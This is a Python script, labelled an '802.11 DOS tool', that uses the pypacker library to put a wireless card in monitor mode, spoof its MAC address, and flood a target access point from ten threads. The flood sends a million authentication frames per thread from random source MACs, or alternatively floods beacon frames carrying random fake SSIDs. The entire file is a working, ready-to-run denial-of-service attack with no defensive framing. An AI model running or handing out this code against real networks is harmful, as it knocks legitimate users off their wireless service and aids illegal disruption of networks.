"""802.11 DOS tool"""
import time
import sys
import threading
import socket
import copy

from pypacker import pypacker, utils
from pypacker.layer12 import radiotap, ieee80211
from pypacker import psocket

# name of monitor interface to use
wlan_monitor_if	= sys.argv[1]
# MAC address of access point
ap_mac		= sys.argv[2]

print("interface/ap: %s %s" % (wlan_monitor_if, ap_mac))
utils.set_wlan_monmode(wlan_monitor_if, monitor_active=False, reactivate=False)
utils.set_ethernet_address(wlan_monitor_if, "24:77:03:01:5C:8D")
utils.set_wlan_monmode(wlan_monitor_if, monitor_active=True)

psocket		= psocket.SocketHndl(wlan_monitor_if)

auth_req_orig	= radiotap.Radiotap() +\
		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_AUTH, to_ds=0, from_ds=0) +\
		ieee80211.IEEE80211.Auth(dst_s=ap_mac, bssid_s=ap_mac)
beacon_orig	= radiotap.Radiotap() +\
		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_BEACON, to_ds=0, from_ds=0) +\
		ieee80211.IEEE80211.Beacon(
			params=[ieee80211.IEEE80211.IE(id=0, len=10, body_bytes=b"\x00" * 10),
				ieee80211.IEEE80211.IE(id=1, len=8, body_bytes=b"\x82\x84\x8b\x96\x0c\x12\x18\x24"),
				ieee80211.IEEE80211.IE(id=3, len=1, body_bytes=b"\x04"),
				ieee80211.IEEE80211.IE(id=5, len=4, body_bytes=b"\x00\x01\x00\x00"),
				ieee80211.IEEE80211.IE(id=0x2A, len=1, body_bytes=b"\x00")
				]
			)


def send_auth(mac):
	"""Send authentications to ap having mac 'mac'"""
	auth_req = copy.deepcopy(auth_req_orig)
	start_time = time.time()

	for i in range(1000000):
		if i % 500 == 0:
			diff = time.time() - start_time
			print("%d pps" % (i / diff) )
		auth_req[ieee80211.IEEE80211.Auth].src = pypacker.get_rnd_mac()

		try:
			psocket.send(auth_req.bin())
		except socket.timeout:
			# timeout on sending? that's ok
			pass
		#time.sleep(0.1)

import string
import random


def send_beacon(_):
	"""Send authentications to ap having mac 'mac'"""
	beacon = copy.deepcopy(beacon_orig)
	start_time = time.time()
	aps_per_channel = 5
	current_channel = 1

	for i in range(1, 10000):
		if i % 100 == 0:
			diff = time.time() - start_time
			print("%d pps" % (i / diff) )
		if i % aps_per_channel == 0:
			current_channel += 1
			current_channel %= 13
			if current_channel == 0:
				current_channel = 1
			#utils.switch_wlan_channel(wlan_monitor_if, current_channel)

		_beacon = beacon[ieee80211.IEEE80211.Beacon]
		mac = pypacker.get_rnd_mac()
		_beacon.src = mac
		_beacon.bssid = mac
		# set new ssid
		_beacon.params[0].body_bytes = bytes( "".join( random.choice(string.ascii_uppercase + string.digits) for _ in range(10)), "ascii")
		#print(_beacon.params[0].body_bytes)
		_beacon.seq = 0

		#print(_beacon)

		try:
			for x in range(100):
			# send multiple beacons for every ap
				psocket.send(beacon.bin())
				_beacon.seq = x
				#_beacon.ts = x << (8*7)
				_beacon.ts = x
		except socket.timeout:
			# timeout on sending? that's ok
			pass

print("starting DOS attack on AP %s" % ap_mac)
amount_threads = 10
threads = []
dos_method = send_auth
#dos_method=send_beacon

print("creating threads")
for x in range(amount_threads):
	thread = threading.Thread(target=dos_method, args=[ap_mac])
	threads.append(thread)
	thread.start()


for thread in threads:
	try:
		thread.join()
	except:
		sys.exit(0)
psocket.close()
